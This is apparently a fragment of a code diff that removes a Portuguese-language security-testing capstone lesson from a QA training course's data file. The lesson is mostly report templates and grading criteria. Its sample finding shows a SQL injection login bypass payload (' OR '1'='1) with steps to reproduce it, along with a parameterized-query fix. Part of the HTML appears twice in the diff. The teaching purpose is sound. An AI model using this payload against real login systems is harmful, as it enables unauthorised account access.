-
-## Resumo de Achados
-| Severidade | Quantidade |
-|------------|------------|
-| 🔴 Critical | X |
-| 🟠 High     | X |
-| 🟡 Medium   | X |
-| 🟢 Low      | X |
-
-## Top 3 Riscos Críticos
-1. **[Título]** — [1 linha impacto] — [Recomendação principal]
-2. **[Título]** — [1 linha impacto] — [Recomendação principal]
-3. **[Título]** — [1 linha impacto] — [Recomendação principal]
-
-## Recomendação Estratégica
-[2-3 parágrafos: priorize fixes, sugira processo (SAST/DAST no CI, threat modeling, treinamento)]</code></pre><h4>2. Relatório Técnico Detalhado (para devs)</h4><pre><code># Technical Findings — [App Name]
-
-## Finding 1: [Título Descritivo]
-- **Severidade:** 🔴 Critical / 🟠 High / 🟡 Medium / 🟢 Low
-- **OWASP Top 10:** A03:2021 – Injection
-- **CWE:** CWE-89 (SQL Injection)
-- **Localização:** <code>POST /api/login</code>, parâmetro <code>email</code>
-- **Impacto:** Extração de base de dados completa, bypass de autenticação, RCE potencial
-- **Evidência:**
-  <pre><code>Request:
-POST /api/login HTTP/1.1
-Content-Type: application/json
-
-{ "email": "' OR '1'='1", "password": "anything" }
-
-Response:
-HTTP/1.1 200 OK
-{ "token": "eyJ...","user": { "id": 1, "role": "admin" } }</code></pre>
-- **Passos para Reproduzir:**
-  1. Acesse <code>/login</code>
-  2. Intercepte request com Burp/ZAP
-  3. Modifique <code>email</code> para <code>' OR '1'='1</code>
-  4. Observe login como primeiro usuário (geralmente admin)
-- **Causa Raiz:** Query SQL construída via concatenação de string: <code>"SELECT * FROM users WHERE email = '" + email + "'"</code>
-- **Recomendação:** Use Prepared Statements / Parameterized Queries. Exemplo: <code>cursor.execute("SELECT * FROM users WHERE email = %s", (email,))</code>
-- **Referências:** OWASP SQL Injection Prevention Cheat Sheet, CWE-89
-
-## Finding 2: [Título]...
-[mesmo formato]</code></pre><h4>3. Evidências (anexos)</h4><ul><li>Screenshots de Burp/ZAP com request/response</li><li>Exports de ZAP report (.html, .json)</li><li>Logs de ferramentas (sqlmap output, nuclei results)</li><li>Vídeo curto (2-3 min) demonstrando exploração</li></ul><h4>4. Repositório GitHub Profissional</h4><ul><li>README com badges, descrição, como rodar</li><li>Pasta <code>/reports</code> com executivo + técnico + evidências</li><li>Pasta <code>/scripts</code> com automações usadas</li><li>GitHub Actions rodando SAST/DAST</li><li>Release v1.0 com relatórios anexados</li></ul><h3>Critérios de avaliação</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Critério</th><th style="padding:0.5rem;border:1px solid var(--border)">Peso</th><th style="padding:0.5rem;border:1px solid var(--border)">Excepcional</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">Cobertura OWASP Top 10</td><td style="padding:0.5rem;border:1px solid var(--border)">20%</td><td style="padding:0.5rem;border:1px solid var(--border)">3+ categorias, 5+ vulns únicas</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">Qualidade da evidência</td><td style="padding:0.5rem;border:1px solid var(--border)">20%</td><td style="padding:0.5rem;border:1px solid var(--border)">Request/response claro, steps reproduzíveis</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">Análise de causa raiz</td><td style="padding:0.5rem;border:1px solid var(--border)">20%</td><td style="padding:0.5rem;border:1px solid var(--border)">Identifica código/padrão vulnerável, não só sintoma</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">Recomendações acionáveis</td><td style="padding:0.5rem;border:1px solid var(--border)">20%</td><td style="padding:0.5rem;border:1px solid var(--border)">Fix específico com exemplo de código seguro</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">Qualidade do relatório executivo</td><td style="padding:0.5rem;border:1px solid var(--border)">10%</td><td style="padding:0.5rem;border:1px solid var(--border)">Claro para não-técnico, priorizado, estratégico</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">Profissionalismo do repo</td><td style="padding:0.5rem;border:1px solid var(--border)">10%</td><td style="padding:0.5rem;border:1px solid var(--border)">README, CI/CD, organização, versionamento</td></tr></table><h3>Próximos passos na carreira</h3><p>Com este projeto no GitHub, você tem:</p><ul><li>Portfólio técnico demonstrando skill de AppSec</li><li>Artefato para discutir em entrevistas ("olha, eu encontrei isso, causei assim, fixei assim")</li><li>Base para certificações: eJPT, OSCP, OSWE, CEH</li><li>Diferencial: maioria dos QAs não faz security testing profundo</li></ul><p><strong>Parabéns por completar a trilha de Security! 🎉</strong></p>", "password": "anything" }
-
-Response:
-HTTP/1.1 200 OK
-{ "token": "eyJ...","user": { "id": 1, "role": "admin" } }</code></pre>
-- **Passos para Reproduzir:**
-  1. Acesse <code>/login</code>
-  2. Intercepte request com Burp/ZAP
-  3. Modifique <code>email</code> para <code>' OR '1'='1</code>
-  4. Observe login como primeiro usuário (geralmente admin)
-- **Causa Raiz:** Query SQL construída via concatenação de string: <code>"SELECT * FROM users WHERE email = '" + email + "'"</code>
-- **Recomendação:** Use Prepared Statements / Parameterized Queries. Exemplo: <code>cursor.execute("SELECT * FROM users WHERE email = %s", (email,))</code>
-- **Referências:** OWASP SQL Injection Prevention Cheat Sheet, CWE-89
-
-## Finding 2: [Título]...
-[mesmo formato]</code></pre><h4>3. Evidências (anexos)</h4><ul><li>Screenshots de Burp/ZAP com request/response</li><li>Exports de ZAP report (.html, .json)</li><li>Logs de ferramentas (sqlmap output, nuclei results)</li><li>Vídeo curto (2-3 min) demonstrando exploração</li></ul><h4>4. Repositório GitHub Profissional</h4><ul><li>README com badges, descrição, como rodar</li><li>Pasta <code>/reports</code> com executivo + técnico + evidências</li><li>Pasta <code>/scripts</code> com automações usadas</li><li>GitHub Actions rodando SAST/DAST</li><li>Release v1.0 com relatórios anexados</li></ul><h3>Critérios de avaliação</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Critério</th><th style="padding:0.5rem;border:1px solid var(--border)">Peso</th><th style="padding:0.5rem;border:1px solid var(--border)">Excepcional</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">Cobertura OWASP Top 10</td><td style="padding:0.5rem;border:1px solid var(--border)">20%</td><td style="padding:0.5rem;border:1px solid var(--border)">3+ categorias, 5+ vulns únicas</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">Qualidade da evidência</td><td style="padding:0.5rem;border:1px solid var(--border)">20%</td><td style="padding:0.5rem;border:1px solid var(--border)">Request/response claro, steps reproduzíveis</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">Análise de causa raiz</td><td style="padding:0.5rem;border:1px solid var(--border)">20%</td><td style="padding:0.5rem;border:1px solid var(--border)">Identifica código/padrão vulnerável, não só sintoma</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">Recomendações acionáveis</td><td style="padding:0.5rem;border:1px solid var(--border)">20%</td><td style="padding:0.5rem;border:1px solid var(--border)">Fix específico com exemplo de código seguro</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">Qualidade do relatório executivo</td><td style="padding:0.5rem;border:1px solid var(--border)">10%</td><td style="padding:0.5rem;border:1px solid var(--border)">Claro para não-técnico, priorizado, estratégico</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)">Profissionalismo do repo</td><td style="padding:0.5rem;border:1px solid var(--border)">10%</td><td style="padding:0.5rem;border:1px solid var(--border)">README, CI/CD, organização, versionamento</td></tr></table><h3>Próximos passos na carreira</h3><p>Com este projeto no GitHub, você tem:</p><ul><li>Portfólio técnico demonstrando skill de AppSec</li><li>Artefato para discutir em entrevistas ("olha, eu encontrei isso, causei assim, fixei assim")</li><li>Base para certificações: eJPT, OSCP, OSWE, CEH</li><li>Diferencial: maioria dos QAs não faz security testing profundo</li></ul><p><strong>Parabéns por completar a trilha de Security! 🎉</strong></p>", resources: [{ label: "OWASP Juice Shop", url: "https://owasp.org/www-project-juice-shop/" }] }
-      ]},
-{
+  {
     id: "devops",
     slug: "pipeline-craft",
     title: "Artesanato de Pipeline",
@@ -2515,7 +2370,7 @@ for (const { name, flags } of FLAG_STATES) {
       ]}
     ]
   },
-{
+  {
     id: "accessibility",
     slug: "inclusive-testing",
     title: "Testes Inclusivos",
@@ -2550,7 +2405,7 @@ for (const { name, flags } of FLAG_STATES) {
       ]}
     ]
   },
-{
+  {
     id: "leadership",
     slug: "guild-mastery",
     title: "Maestria da Guilda",
